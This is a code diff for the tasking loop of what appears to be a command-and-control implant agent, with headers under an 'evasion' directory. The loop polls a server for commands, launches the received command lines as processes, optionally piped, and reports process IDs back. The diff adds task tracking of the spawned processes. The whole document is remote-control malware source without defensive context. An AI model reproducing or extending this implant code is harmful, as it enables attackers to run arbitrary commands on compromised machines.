@@ -1,4 +1,5 @@
 #include "../../headers/taskcontroller/TaskController.h"
+#include "../../headers/taskcontroller/Task.h"
 #include "../../headers/agent/evasion/Common.h"
 #include "../../headers/package/package.h"
 #include "../../headers/cstdreplacement/localcstd.h"
@@ -32,6 +33,8 @@ void TaskingRoutine() {
         {
             continue;
         }
+
+    	CheckTasks();
 
         //TODO perform package sending request. that will send all open packages and receive any responses from the server for commands to execute.
         if (!PackageSendAll(&Buffer, &DataBufferSize))
@@ -156,9 +159,6 @@ void TaskingRoutine() {
 		    		BOOL Piped = ParserReadInt32(&TaskParser);
 		    		NumberOfArgs--; // read the piped argument
 
-		    		WCHAR ApplicationNameW[MAX_PATH] = {0};
-		    		WCHAR CommandLineW[4196] = {0};
-
 		    		UCHAR ApplicationName[MAX_PATH] = {0};
 		    		UCHAR CommandLine[4196] = {0};
 
@@ -168,17 +168,14 @@ void TaskingRoutine() {
 		    			PUCHAR Data = ParserReadBytes(&TaskParser, &Length);
 		    			switch(i) {
 		    				case 0:
-		    					CharToWChar(&ApplicationNameW[Index], Data, Length);
 		    				MemoryCopy(&ApplicationName[Index], Data, Length);
 		    				break;
 
 		    				default:
-		    					CharToWChar(&CommandLineW[Index], Data, Length);
 		    				MemoryCopy(&CommandLine[Index], Data, Length);
 		    				if (i == NumberOfArgs - 1)
 		    					break; // dont need  to add the extra space at the end of the string.
 		    				CommandLine[Index + Length] = '\x20';
-		    				CommandLineW[Index+Length] = L' ';
 		    				Index += Length + 1;
 		    				break; // parse arguments.
 		    			}
@@ -188,21 +185,22 @@ void TaskingRoutine() {
 		    		BOOL Success = FALSE;
 
 		    		PROCESS_INFORMATION pi = {0};
-		    		PUCHAR Buffer = NULL;
-		    		Success = ProcessCreate(Piped, ApplicationNameW, CommandLineW, &pi, Buffer);
+                	PPIPE pPipe = NULL;
+		    		Success = ProcessCreate(Piped, ApplicationName, CommandLine, &pi, pPipe);
+
+                	TaskAdd(AgentCMD.RequestID, agent->TaskList->TaskCount, TASK_TRACK_PROCESS, TASK_STATUS_RUNNING,
+                		pPipe, pi.hProcess);
 
 
 		    		if(!Success)
 		    			AddInt32ToPackage(pPackage, 0);
 		    		else {
 		    			AddInt32ToPackage(pPackage, pi.dwProcessId);
-		    			AddStringToPackage(pPackage, Buffer);
 		    		}
 
 		    		END_OF_CMD_EXEC:
 
 					RtlSecureZeroMemory(CommandLine, sizeof(CommandLine));
-
 
 		    		break;
 		    	}// EXEC CMD
